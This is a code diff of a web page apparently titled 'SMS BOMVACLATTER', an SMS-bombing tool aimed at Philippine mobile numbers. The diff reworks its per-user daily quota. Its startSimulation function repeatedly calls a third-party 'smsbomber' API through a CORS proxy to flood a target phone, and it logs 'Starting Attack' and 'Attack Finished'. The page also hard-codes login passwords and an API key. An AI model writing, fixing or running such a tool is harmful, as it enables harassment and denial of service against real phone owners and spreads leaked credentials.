@@ -108,6 +108,7 @@
     <div id="loginMessage" class="log-entry"></div>
     <div class="certified-link" onclick="showValidUsers()">🔎 Valid Users</div>
   </div>
+
   <div id="main-section" class="card" style="display: none;">
     <h1>DA-BEHNCI SMS BOMVACLATTER</h1>
     <div id="chancesDisplay" style="margin-bottom: 12px; font-size: 14px; font-weight: bold;"></div>
@@ -118,6 +119,7 @@
     <div class="timer" id="timerDisplay"></div>
     <div class="log" id="logBox"></div>
   </div>
+
   <script>
     const certifiedUsers = [
       { name: "Admin", pass: "Bomva" },
@@ -148,25 +150,7 @@
       { name: "Jewel", pass: "Jew601" }
     ];
 
-    let currentUser     = "";
-    let lastLogDate = "";
-
-    function checkLogReset() {
-      const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));
-      const todayStr = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}`;
-
-      if (lastLogDate !== todayStr) {
-        lastLogDate = todayStr;
-        document.getElementById("logBox").innerHTML = "";  // clear logs
-        if (currentUser     !== "") {
-          localStorage.setItem(`${currentUser  }-chances`, 5); // Reset chances for the new day
-          updateChancesDisplay(); // refresh chances
-        }
-      }
-    }
-
-    // Automatically check every 1 minute (adjustable)
-    setInterval(checkLogReset, 60000);
+    let currentUser = "";
 
     function togglePassword() {
       const pw = document.getElementById("password");
@@ -187,24 +171,115 @@
         return;
       }
 
-      loginMessage.textContent = ""; // clear error
-      currentUser     = found.name;
+      loginMessage.textContent = "";
+      currentUser = found.name;
       document.getElementById("login-section").style.display = "none";
       document.getElementById("main-section").style.display = "block";
 
-      // Load chances from localStorage
-      const chances = parseInt(localStorage.getItem(`${currentUser  }-chances`)) || 5;
-      localStorage.setItem(`${currentUser  }-chances`, chances); // Initialize chances if not set
+      const today = new Date().toLocaleDateString("en-US", { timeZone: "Asia/Manila" });
+      const userKey = `${currentUser}-chancesData`;
+      const stored = JSON.parse(localStorage.getItem(userKey));
+
+      if (currentUser !== "Admin") {
+        if (!stored || stored.date !== today) {
+          localStorage.setItem(userKey, JSON.stringify({ chances: 5, date: today }));
+        }
+      }
+
       updateChancesDisplay();
+    }
+
+    function updateChancesDisplay() {
+      if (currentUser === "Admin") {
+        document.getElementById("chancesDisplay").textContent = "Logged in as Admin";
+        return;
+      }
+      const userKey = `${currentUser}-chancesData`;
+      const stored = JSON.parse(localStorage.getItem(userKey)) || { chances: 5 };
+      document.getElementById("chancesDisplay").textContent =
+        `Chances Left Today: ${stored.chances}`;
+    }
+
+    function startSimulation() {
+      let number = document.getElementById("number").value.trim();
+      const count = parseInt(document.getElementById("count").value.trim());
+      const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
+      const logBox = document.getElementById("logBox");
+      const timerDisplay = document.getElementById("timerDisplay");
+      const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8";
+
+      if (number.length === 10 && number.startsWith("9")) {
+        number = "0" + number;
+        document.getElementById("number").value = number;
+      }
+
+      const isValidNumber = /^09\d{9}$/.test(number);
+      if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {
+        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";
+        return;
+      }
+
+      const userKey = `${currentUser}-chancesData`;
+      let stored = JSON.parse(localStorage.getItem(userKey)) || { chances: 5 };
+
+      if (currentUser !== "Admin") {
+        if (stored.chances <= 0 || count > 20) {
+          logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Limit reached.</div>";
+          return;
+        }
+      }
+
+      logBox.innerHTML = "";
+      timerDisplay.textContent = "🚀 Starting Attack...";
+
+      let completed = 0;
+      for (let i = 1; i <= count; i++) {
+        const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;
+        setTimeout(() => {
+          fetch(url)
+            .then(res => res.json())
+            .then(data => {
+              const result = data.message || "SMS bombing completed.";
+              const log = document.createElement("div");
+              log.className = "log-entry";
+              log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;
+              logBox.appendChild(log);
+              logBox.scrollTop = logBox.scrollHeight;
+
+              completed++;
+              if (completed === count) {
+                timerDisplay.textContent = "✅ Attack Finished.";
+              }
+
+              if (currentUser !== "Admin") {
+                stored.chances -= 1;
+                localStorage.setItem(userKey, JSON.stringify(stored));
+                updateChancesDisplay();
+              }
+            })
+            .catch(error => {
+              const log = document.createElement("div");
+              log.className = "log-entry";
+              log.style.color = "red";
+              log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;
+              logBox.appendChild(log);
+              logBox.scrollTop = logBox.scrollHeight;
+
+              completed++;
+              if (completed === count) {
+                timerDisplay.textContent = "✅ Attack Finished.";
+              }
+            });
+        }, i * delay * 1000);
+      }
     }
 
     function showValidUsers() {
       const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);
-
       const existing = document.getElementById("validUsersPopup");
       if (existing) {
-        existing.remove(); // if already open, remove it
-        return;            // toggle behavior
+        existing.remove();
+        return;
       }
 
       const popup = document.createElement("div");
@@ -252,88 +327,6 @@
       });
 
       document.body.appendChild(popup);
-    }
-
-    function updateChancesDisplay() {
-      const chances = parseInt(localStorage.getItem(`${currentUser  }-chances`)) || 5;
-      document.getElementById("chancesDisplay").textContent =
-        currentUser     === "Admin" ? "Logged in as Admin" : `Chances Left Today: ${chances}`;
-    }
-
-    function startSimulation() {
-      let number = document.getElementById("number").value.trim();
-      const count = parseInt(document.getElementById("count").value.trim());
-      const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
-      const logBox = document.getElementById("logBox");
-      const timerDisplay = document.getElementById("timerDisplay");
-      const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8"; // Use a secure method to store this
-
-      if (number.length === 10 && number.startsWith("9")) {
-        number = "0" + number;
-        document.getElementById("number").value = number;
-      }
-
-      const isValidNumber = /^09\d{9}$/.test(number);
-      if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {
-        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";
-        return;
-      }
-
-      const chances = parseInt(localStorage.getItem(`${currentUser  }-chances`)) || 5;
-
-      if (currentUser     !== "Admin") {
-        if (chances <= 0 || count > 20) {
-          logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Limit reached.</div>";
-          return;
-        }
-      }
-
-      logBox.innerHTML = "";
-      timerDisplay.textContent = "🚀 Starting Attack...";
-
-      let completed = 0;
-
-      for (let i = 1; i <= count; i++) {
-        const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;
-
-        setTimeout(() => {
-          fetch(url)
-            .then(res => res.json())
-            .then(data => {
-              const result = data.message || "SMS bombing completed.";
-              const log = document.createElement("div");
-              log.className = "log-entry";
-              log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;
-              logBox.appendChild(log);
-              logBox.scrollTop = logBox.scrollHeight;
-
-              completed++;
-              if (completed === count) {
-                timerDisplay.textContent = "✅ Attack Finished.";
-              }
-
-              // Decrement chances after each successful SMS sent
-              if (currentUser     !== "Admin") {
-                let newChances = chances - 1;
-                localStorage.setItem(`${currentUser  }-chances`, newChances);
-                updateChancesDisplay(); // Update the display after sending
-              }
-            })
-            .catch(error => {
-              const log = document.createElement("div");
-              log.className = "log-entry";
-              log.style.color = "red";
-              log.textContent = `${i.toString().padStart(2, '0')} ❌ Error: ${error.message}`;
-              logBox.appendChild(log);
-              logBox.scrollTop = logBox.scrollHeight;
-
-              completed++;
-              if (completed === count) {
-                timerDisplay.textContent = "✅ Attack Finished.";
-              }
-            });
-        }, i * delay * 1000);
-      }
     }
   </script>
 </body>
